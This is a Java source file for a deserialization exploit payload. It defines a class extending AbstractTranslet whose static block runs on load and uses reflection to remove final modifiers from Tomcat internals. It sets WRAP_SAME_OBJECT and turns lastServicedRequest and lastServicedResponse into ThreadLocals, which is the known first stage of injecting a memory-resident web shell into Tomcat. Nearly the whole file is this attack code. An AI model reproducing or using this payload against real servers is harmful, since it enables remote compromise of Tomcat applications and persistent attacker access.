package com.example.demo.Static;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
public class TemplatesImpl extends AbstractTranslet {
    static{
        try {
            // 获取 modifiers，用于把 Final 属性给取消掉
            Field modifiers = Field.class.getDeclaredField("modifiers");
            modifiers.setAccessible(true);
            // 修改 WRAP_SAME_OBJECT 值为 true
            Class clzApplicationDispatcher = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            Field WRAP_SAME_OBJECTField = clzApplicationDispatcher.getDeclaredField("WRAP_SAME_OBJECT");
            modifiers.setInt(WRAP_SAME_OBJECTField, modifiers.getInt(WRAP_SAME_OBJECTField) & (~Modifier.FINAL));
            WRAP_SAME_OBJECTField.setAccessible(true);
            if (!WRAP_SAME_OBJECTField.getBoolean(null)) {
                WRAP_SAME_OBJECTField.setBoolean(null, true);
            }
            // 重新初始化 lastServicedRequest 对象，让它变为 ThreadLocal
            Class clzApplicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            Field lastServicedRequestField = clzApplicationFilterChain.getDeclaredField("lastServicedRequest");
            modifiers.setInt(lastServicedRequestField, modifiers.getInt(lastServicedRequestField) & (~Modifier.FINAL));
            lastServicedRequestField.setAccessible(true);
            if (lastServicedRequestField.get(null) == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
            }
            // 重新初始化 lastServicedRequest 对象，让它变为 ThreadLocal
            Field lastServicedResponseField = clzApplicationFilterChain.getDeclaredField("lastServicedResponse");
            modifiers.setInt(lastServicedResponseField, modifiers.getInt(lastServicedResponseField) & (~Modifier.FINAL));
            lastServicedResponseField.setAccessible(true);
            if (lastServicedResponseField.get(null) == null) {
                lastServicedResponseField.set(null, new ThreadLocal<>());
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
